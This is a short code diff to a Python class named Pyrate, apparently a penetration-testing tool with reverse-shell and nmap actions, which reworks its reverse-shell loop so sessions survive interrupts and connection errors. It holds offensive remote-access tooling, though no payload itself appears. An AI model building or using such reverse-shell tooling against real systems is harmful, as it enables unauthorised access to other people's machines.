@@ -33,9 +33,8 @@ class Pyrate:
 
     def __init__(self, lhost, lport, rhost):
         self.cli = CLI()
-        self.cli.prompt_text = '$'
+        self.cli.prompt_text = '> '
         self.running = True
-
         self.lhost = lhost
         self.lport = lport
         self.rhost = rhost
@@ -63,22 +62,31 @@ class Pyrate:
             print('actions: [r]everse, [n]map, [h]elp, [q]uit')
 
     def start_reverse_shell(self):
+        contd = False
         stop = False
         while not stop:
-            rshell = None
             try:
-                rshell = ReverseShell(self.lhost, self.lport, self.rhost)
+                if (not contd):
+                    rshell = None
+                    rshell = ReverseShell(self.lhost, self.lport, self.rhost)
+                    contd = False
                 rshell.main_loop()
+                break
             except KeyboardInterrupt as e:
                 key = input(' do you want to stop (y)? ')
                 if (key == 'y'):
                     stop = True
+                else:
+                    contd = True
+                    continue
             except BrokenPipeError as e:
                 print(e)
             except ConnectionResetError as e:
                 print(e)
             except OSError as e:
                 print(e)
+                contd = True
+                continue
             if (rshell):
                 del rshell
             if (not stop):
